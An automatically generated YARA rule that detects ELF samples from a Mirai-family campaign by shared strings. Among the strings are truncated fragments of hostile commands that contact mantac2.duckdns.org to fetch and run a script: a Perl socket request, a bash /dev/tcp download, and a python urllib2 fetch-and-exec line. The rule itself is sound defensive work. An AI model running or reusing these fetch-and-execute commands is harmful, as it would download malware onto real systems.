rule Sightlines_tlsh_bb842806_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-bb842806"
        date = "2026-10-29"
        campaign = "tlsh-bb842806"
        family = "mirai"
        hash = "167c44b17a6f796970a2a18ff391ea9d8ed4a0cc6820e22615b11716da5704be"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-bb842806.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "(pd)->header.sysinfo == THREAD_GETMEM (THREAD_SELF, header.sysinfo)" ascii
        $s11 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3584384 and 12 of them
}
